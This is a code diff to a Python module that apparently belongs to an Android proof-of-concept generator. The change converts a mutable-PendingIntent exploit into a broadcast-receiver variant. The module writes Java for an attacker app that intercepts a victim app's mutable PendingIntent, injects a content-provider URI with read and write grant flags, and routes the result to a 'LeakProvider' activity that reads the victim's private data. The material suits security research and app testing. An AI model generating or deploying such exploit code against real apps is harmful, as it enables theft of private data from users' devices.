@@ -16,7 +16,7 @@ class SherlockModule(App):
 
     def __init__(self):
         super().__init__()
-        self._id = "mutable_pending_intent_basic"
+        self._id = "mutable_pending_intent_basic_broadcast"
         self._template = Template()
 
 
@@ -73,51 +73,79 @@ class SherlockModule(App):
         provider_type = opts['PROVIDER_TYPE']
         put_extra = opts['PUT_EXTRA']
 
+        exploit_activity_name = self.activity_name(self._id, target_package)
+        leak_provider_activity_name = f'{self.activity_name(self._id, target_package)}LeakProvider'
+
         manifest = [
             self._template.build_manifest_component(
-                self.intercept_activity_name(self._id, target_package),
-                is_exported=True,
-                intercept=True,
-                action=wrapper_action
+                exploit_activity_name,
+                is_exported=True
             ),
             self._template.build_manifest_component(
-                self.leak_provider_activity_name(self._id, target_package),
+                leak_provider_activity_name,
                 is_exported=True,
                 intercept=True,
-                action="sherlock.poc.MUTABLE_PENDING_INTENT_BASIC" if base_action == "" else base_action
-            ),
-            self._template.build_manifest_component(
-                self.activity_name(self._id, target_package)
+                action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else base_action
             )
         ]
 
+        on_create = [
+            f'Toast.makeText(this, "Registering receiver with action: {wrapper_action}", Toast.LENGTH_SHORT).show();',
+            self._template.register_receiver(
+                intent_filter=wrapper_action,
+            ),
+            self._template.build_intent(
+                set_action="android.intent.action.VIEW" if via_deeplink else None,
+                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
+                set_classname=[target_package, target_class] if not via_deeplink else [],
+                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
+            )
+        ]
+
+        if not is_exported:
+            on_create.pop()
+
         hijack_activity = self._template.build_activity(
-            name=self.intercept_activity_name(self._id, target_package),
+            name=exploit_activity_name,
             libs=[
+                "android.content.BroadcastReceiver",
+                "android.content.Context",
+                "android.content.IntentFilter",
                 "android.app.PendingIntent",
                 "android.content.ClipData",
                 "android.content.Intent",
                 "android.net.Uri",
                 "android.os.Bundle",
                 "android.util.Log",
+                "android.widget.Toast",
                 "androidx.appcompat.app.AppCompatActivity"
             ],
-            on_create=[
-                f'Bundle bundle = getIntent().getBundleExtra("{bundle_extra}");\nPendingIntent pi = bundle.getParcelable("{bundle_parcel}");' if bundle_extra != "" else "",
-                f'PendingIntent pi = getIntent().getParcelableExtra("{parcel_extra}");',
-                self._template.build_intent(
-                    intent_var="hijack",
-                    set_action="sherlock.poc.MUTABLE_PENDING_INTENT_BASIC" if base_action == "" else None,
-                    set_clipdata=provider_uri,
-                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
-                    start_activity=False
-                ),
-                f"try {{ pi.send(this, {request_code}, hijack, null, null); }} catch (PendingIntent.CanceledException e) {{ throw new RuntimeException(e); }}"
+            bind_button=True,
+            on_create=on_create,
+            on_destroy=[
+                f"unregisterReceiver(receiver);"
+            ],
+            listener=[
+                self._template.build_dynamic_receiver(
+                    on_receive=[
+                        f'Bundle bundle = intent.getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "",
+                        f'PendingIntent pi = bundle.getParcelable("{bundle_parcel}");' if bundle_extra != "" else "",
+                        f'PendingIntent pi = intent.getParcelableExtra("{parcel_extra}");',
+                        self._template.build_intent(
+                            intent_var="hijack",
+                            set_action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else None,
+                            set_clipdata=provider_uri,
+                            set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
+                            start_activity=False
+                        ),
+                        f"try {{ pi.send(context, {request_code}, hijack, null, null); }} catch (PendingIntent.CanceledException e) {{ throw new RuntimeException(e); }}"
+                    ]
+                )
             ]
         )
 
         leak_provider_activity = self._template.build_activity(
-            name=self.leak_provider_activity_name(self._id, target_package),
+            name=leak_provider_activity_name,
             libs=[
                 "android.content.Context",
                 "android.content.Intent",
@@ -142,47 +170,21 @@ class SherlockModule(App):
             ]
         )
 
-        exploit_activity = self._template.build_activity(
-            name=self.activity_name(self._id, target_package),
-            libs=[
-                "android.content.Context",
-                "android.content.Intent",
-                "android.net.Uri",
-                "android.os.Bundle",
-                "androidx.appcompat.app.AppCompatActivity"
-            ],
-            bind_button=True,
-            on_create=[self._template.build_intent(
-                set_action="android.intent.action.VIEW" if via_deeplink else None,
-                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
-                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
-                set_classname=[target_package, target_class] if not via_deeplink else []
-            )]
-        )
-
         component = [
             {
-                "name": f"{self.intercept_activity_name(self._id, target_package)}.java",
+                "name": f"{exploit_activity_name}.java",
                 "content": hijack_activity 
             },
             {
-                "name": f"{self.leak_provider_activity_name(self._id, target_package)}.java",
+                "name": f"{leak_provider_activity_name}.java",
                 "content": leak_provider_activity 
-            },
-            {
-                "name": f"{self.activity_name(self._id, target_package)}.java",
-                "content": exploit_activity 
             }
         ]
 
-        if not is_exported:
-            manifest.pop()
-            component.pop()
-
         app = {
             "manifest": manifest,
-            "layout": self._template.button_layout(self._id, target_package) if is_exported else None,
-            "bind_button": self._template.bind_button(self._id, target_package) if is_exported else None,
+            "layout": self._template.button_layout(self._id, target_package),
+            "bind_button": self._template.bind_button(self._id, target_package),
             "component": component
         }
 
